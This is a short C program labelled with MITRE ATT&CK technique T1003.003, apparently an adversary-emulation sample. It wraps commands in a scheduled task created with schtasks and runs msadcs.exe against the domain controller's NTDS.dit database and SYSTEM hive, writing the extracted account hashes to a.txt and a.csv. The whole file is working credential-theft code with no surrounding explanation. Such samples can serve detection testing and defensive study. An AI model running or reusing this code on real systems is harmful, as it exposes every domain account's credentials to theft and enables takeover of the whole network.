// Link      = https://attack.mitre.org/techniques/T1003/003/
// Technique = OS Credential Dumping: NTDS
// ID        = T1003.003
// Tactics   = Credential Access

#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}